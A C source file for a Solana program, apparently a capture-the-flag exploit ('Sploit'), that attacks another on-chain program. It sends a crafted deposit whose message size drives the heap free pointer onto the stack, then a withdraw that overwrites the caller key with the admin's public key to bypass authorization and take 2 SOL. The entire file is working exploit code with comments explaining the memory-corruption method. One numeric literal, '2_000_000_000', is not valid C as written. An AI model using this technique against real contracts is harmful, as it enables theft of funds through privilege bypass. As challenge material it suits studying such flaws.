#include <solana_sdk.h>

#define USER 0
#define ADMIN 1
#define PROGRAM_ID 2
#define DATA_ACCOUNT 3
#define SYSTEM_ID 4

#define ERROR_SPLOIT 42

typedef struct __attribute__((packed)) {
  uint8_t bump;
  uint8_t type;
  uint64_t amount;
  uint64_t msg_size;
  uint8_t msg[1];
} UserInput;

extern uint64_t entrypoint(const uint8_t *input) {
  SolPubkey caller_key;

  SolAccountInfo accounts[5];
  SolParameters params = (SolParameters){.ka = accounts};

  if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts))) {
    return ERROR_INVALID_ARGUMENT;
  }

  if (params.data_len != 1) {
    return ERROR_INVALID_ARGUMENT;
  }

  uint8_t bump = params.data[0];
  sol_log("Sploit running, logging bump");
  sol_log_64(0, 0, 0, 0, bump);
  sol_log("caller_key address");
  sol_log_64_(0, 0, 0, 0, (uint64_t)&caller_key); // always 0x200000fd0

  SolAccountMeta arguments[] = {{accounts[USER].key, true, true},
                                {accounts[DATA_ACCOUNT].key, true, false},
                                {accounts[PROGRAM_ID].key, true, false},
                                {accounts[SYSTEM_ID].key, false, false}};

  // First operation with malloc() to get free_pointer to 0x200000fde, the start
  // of the stack (caller_key) to override it on the next operation
  UserInput ixInputDeposit = {
      .bump = bump,
      .type = 1,
      .amount = 1000,
      // 0x300000000 is HEAP_START_ADDRESS_, 8 bytes are used by `free_ptr`
      .msg_size = ((uint64_t)(0x200000fde) - (uint64_t)(0x300000000 + 8)),
      .msg = "\x00",
  };
  sol_log("Deposit msg size");
  sol_log_64(0, 0, 0, 0, ixInputDeposit.msg_size);

  // Second operation with withdraw, actually overrides the caller_key using
  // ADMIN's public key to bypass the check.
  UserInput ixInputWithdraw = {
      .bump = bump,
      .type = 2,
      .amount = 2_000_000_000, // 2 SOL
      .msg_size = 8,
      .msg = "\x00",
  };
  uint8_t ix_data[1 + 2 * sizeof(UserInput) + sizeof(SolPubkey)] = {2};
  *(UserInput *)(ix_data + 1) = ixInputDeposit;
  *(UserInput *)(ix_data + 1 + sizeof(UserInput)) = ixInputWithdraw;
  *(SolPubkey *)(ix_data + 1 + 2 * sizeof(UserInput) - 1) =
      *accounts[ADMIN].key;
  ix_data[1 + 2 * sizeof(UserInput) + sizeof(SolPubkey) - 1] = 0;

  sol_log("ix_data");
  sol_log_array(ix_data, SOL_ARRAY_SIZE(ix_data));
  sol_log("data account data");
  sol_log_array(accounts[DATA_ACCOUNT].data, 40);

  const SolInstruction instruction = {accounts[PROGRAM_ID].key, arguments,
                                      SOL_ARRAY_SIZE(arguments), ix_data,
                                      SOL_ARRAY_SIZE(ix_data)};
  if (sol_invoke(&instruction, accounts, SOL_ARRAY_SIZE(accounts)) != SUCCESS) {
    return ERROR_SPLOIT;
  }

  return SUCCESS;
}
